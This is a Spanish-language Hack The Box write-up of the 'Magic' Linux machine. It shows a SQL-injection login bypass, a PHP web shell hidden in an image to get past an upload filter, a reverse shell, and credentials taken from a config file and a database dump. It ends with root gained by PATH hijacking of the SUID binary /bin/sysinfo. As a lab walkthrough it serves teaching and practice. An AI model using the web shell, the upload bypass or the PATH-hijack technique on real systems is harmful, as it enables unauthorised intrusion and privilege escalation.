---
layout      : post
title       : "Maquina Magic - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Magic/banner2.jpg
category    : [ hackthebox ]
tags        : [ sql injection, bypass upload file, information leaked, abusing mysql, absusing suid, path hijacking  ]
---

En esta ocasión vamos a resolver la máquina `Magic` de la plataforma de `hackthebox` correspondiente a una `linux` dificultad media, la cual explotaremos evadiendo el panel de logeo mediante una inyeccion simple en sql, despues aprovecharemos de una mala sanizitación de subida de archivos derivandola en una ejecución remota de comandos; una vez dentro del sistema obtendremos credenciales enumerando la base de datos y finamente aprocecharemos el permiso `suid` de un binario, para ejecutar una `path hijacking` que nos dara acceso como el usuario `root`.
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Magic
❯ ls
 Magic
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.185
PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.10.185 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.232/137.232/137.232/0.000 ms
```
Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.185 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:00 GMT
Initiating SYN Stealth Scan at 21:00
Scanning 10.10.10.185 [65535 ports]
Discovered open port 80/tcp on 10.10.10.185
Discovered open port 22/tcp on 10.10.10.185
Completed SYN Stealth Scan at 21:00, 16.68s elapsed (65535 total ports)
Nmap scan report for 10.10.10.185
Host is up, received user-set (0.12s latency).
Scanned at 2023-06-13 21:00:26 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
           Raw packets sent: 82274 (3.620MB) | Rcvd: 81681 (3.267MB)
```
Podemos ver que los puertos que se encuentran abiertos son el puerto `22 ssh` y el `80 http`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,80 10.10.10.185 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:01 GMT
Nmap scan report for 10.10.10.185
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | HTTP     | Apache httpd 2.4.29 |


Seguidamente vamos a usar la herramienta `whatweb` para ver por consola el gestor de contenido de la pagina web.

```python
❯ whatweb http://10.10.10.185
http://10.10.10.185 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.185], JQuery, Script, Title[Magic Portfolio]
```

## Explotación [#](#explotación) {#explotación}

Vamos seguidamente a abrir la web en nuestro navegador.

![](/assets/images/HTB/htb-writeup-Magic/magic1.PNG)

Observamos una que la pagina se compone de una serie de imagenes y tambien podemos ver que existe un enlace a un login que procederemos a visitar.

![](/assets/images/HTB/htb-writeup-Magic/magic2.PNG)

Para tratar de averiguar la ruta donde sube las imagenes, podemos usar el inspeccionador de elementos y mostrar la ruta de donde cargan las imagenes que corresponde a `/uploads`

![](/assets/images/HTB/htb-writeup-Magic/magic6.PNG)

Probamos a tratar de logearnos con credenciales por defecto pero nos resulta imposible. Como estamos frente a un panel de logeo, podemos tratar de ocasionar un error en los inputs mediante una `sql injection`.

![](/assets/images/HTB/htb-writeup-Magic/magic3.PNG)


Como resultado podemos logramos logearnos exitosamente y nos redirige a un panel donde podemos subir una imagen. Para ver si bien sanitizada la subida de archivos, probaremos con subir un archivo de nombre `cmd.php` que mediante el uso de etiquetas preformateadas y haciendo uso de la función `shell_exec` con el parametro `cmd` ejecutar comandos.

![](/assets/images/HTB/htb-writeup-Magic/magic4.PNG)


```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Procedemos a subir el archivo pero vemos que solo admite formatos de imagen.

![](/assets/images/HTB/htb-writeup-Magic/magic5.PNG)


![](/assets/images/HTB/htb-writeup-Magic/magic7.PNG)


Podemos probar a renombrar nuestro archivo `cmd.php` y asignarle una doble extensión para asi tratar de bypasear la subida.


![](/assets/images/HTB/htb-writeup-Magic/magic8.PNG)


Vemos que esta vez cambie el mensaje de error, y detecta que estamos tratando de manipular la subida.

![](/assets/images/HTB/htb-writeup-Magic/magic9.PNG)


Debemos de tener en cuenta que en base a los `magic numbers` que son los primeros bytes de los archivos se validan los tipos de archivos en este caso si con el comando `file` tratamos de validar nuestro archivo `cmd.php.png`.

```bash
❯ file cmd.php.png
cmd.php.png: PHP script, ASCII text
```

Nos detecta que es un `php script`, pero si agregamos la cabezera `GIF8;` al inicio de nuestro archivo ahora nos lo detectara como `gif image`.

```php
❯ file cmd.php.png
cmd.php.png: GIF image data 16188 x 26736
```

Probaremos a subir nuevamente el archivo modificado.


![](/assets/images/HTB/htb-writeup-Magic/magic10.PNG)


Obtenemos el mismo error, asi que esta vez vamos a descargar una imagen cualquier de `google`.


![](/assets/images/HTB/htb-writeup-Magic/magic11.PNG)

Ahora vamos a alterar su contenido añadiendo una intrucción en `php` y añadiendo la extensión `.php`.


![](/assets/images/HTB/htb-writeup-Magic/magic12.PNG)


Subimos nuevamente el archivo y esta vez nos lo hace correctamente.

![](/assets/images/HTB/htb-writeup-Magic/magic13.PNG)

![](/assets/images/HTB/htb-writeup-Magic/magic14.PNG)


Vamos a la ruta donde se suben las imagenes que la obtuvimos previamente y efectivamente podemos ver nuestro archivo, aunque en un formato no legible por ser binario.

![](/assets/images/HTB/htb-writeup-Magic/magic15.PNG)


Validamos si podemos ejecutar comandos gracias a la instrucción php que añadimos y tenemos ejecución de comandos.

![](/assets/images/HTB/htb-writeup-Magic/magic16.PNG)

Ahora con bash vamos a enviarnos una reverse shell, para ello nos pondremos en escucha con `ncat` en el puerto `443` y obtenemos acceso como el usuario `www-data`

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:51270.
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
whoami
www-data
```

Ahora como de costumbre vamos a otorgarnos una `tty full interactiva`.

```bash
www-data@ubuntu:/var/www/Magic/images/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ export SHELL=bash 
www-data@ubuntu:/var/www/Magic/images/uploads$ stty rows 45 columns 184
```

Si volvemos al directorio `Magic`, encontraremos un archivo `db.php5` el cual contiene unas credenciales.

```bash
www-data@ubuntu:/var/www/Magic$ ls
assets	db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5 
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

Si tratamos de usar las credenciales para conectarnos como `theseus`, vemos que no corresponde, pero podemos tratar de conectarnos a la base de datos. Y al no existir `mysql`, podemos usar `mysqlshow`

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
su: Authentication failure
www-data@ubuntu:/var/www/Magic$ mysqlshow -utheseus -piamkingtheseus
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
```

Podemos enumerar las bases de datos utilizadas, y ahora usaremos `mysqldump` para dumpear las datos  almancenados en la base de datos `Magic`


```sql
www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-06-13 15:00:33
```

Obtenemos unas credenciales correspondientes al usuario `theseus`, ahora podemos migrar al usuario, dirigirnos al directorio del usuario y visualizar la primera flag `user.txt`


```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$ whoami
theseus
theseus@ubuntu:/var/www/Magic$ cd /home/theseus/
theseus@ubuntu:~$ cat user.txt 
fb197a83208d0d99ecdbed4ee83fc4f0
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Listamos los archivos con privilegios `suid`, vemos uno inusual `/bin/sysinfo`

```bash
theseus@ubuntu:~$ find / -perm -4000 2>/dev/null | grep -v "snap"
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

Si vemos los caracteres imprimibles del binario con la ayuda de `strings`, podemos ver que hace uso del comando `fdisk`, de manera relativa.


```bash
theseus@ubuntu:~$ strings /bin/sysinfo
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
__gmon_start__
_ITM_deregisterTMCloneTable
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$"
zPLR
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
```

Lo que haremos ahora sera efectuar un `path hijacking`, donde alteraremos la ruta de nuestro `path` y crearemos un archivo de nombre `fdisk` donde le otorgaremos el privilegio `suid a la bash`, de modo tal que al ejecutar `/bin/sysinfo` hara uso del comando `fdisk` y al haber manipulado nuestro `path` lo hara desde la ruta actual que especifiquemos donde tendremos nuestro archivo creado, esto debido a que `fdisk` no se esta aplicando de manera absoluta.


Te dejo el siguiente articulo para que veas mas a fondo esta vulnerabilidad.

* [https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking](https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking)


Procedemos a crearnos el archivo en la ruta `/tmp`, que generalamente es donde se tiene permiso de escritura y le damos permiso de ejecución.

```bash
theseus@ubuntu:/tmp$ cat fdisk 
#!/bin/bash

chmod u+s /bin/bash
theseus@ubuntu:/tmp$ chmod +x fdisk
```

Ahora manilupalaremos nuestro `path` para que este tire desde la ruta `/tmp`

```bash
theseus@ubuntu:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
theseus@ubuntu:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```


Ejecutamos el `/bin/sysinfo` y vemos el privilegios de la `/bin/bash` fue asignado correctamente.

```bash
theseus@ubuntu:/tmp$ /bin/sysinfo
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform

theseus@ubuntu:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Ahora solo debemos ejecutar el comando `bash -p` y estariamos como el usuario `root`, seguidamente podemos dirigirnos al directorio del usuario `root` y visualizar la segunda flag `root.txt`.


```bash
theseus@ubuntu:/tmp$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# cat root.txt 
a4f562d7949903aa1bf84994c94ce9e3
```



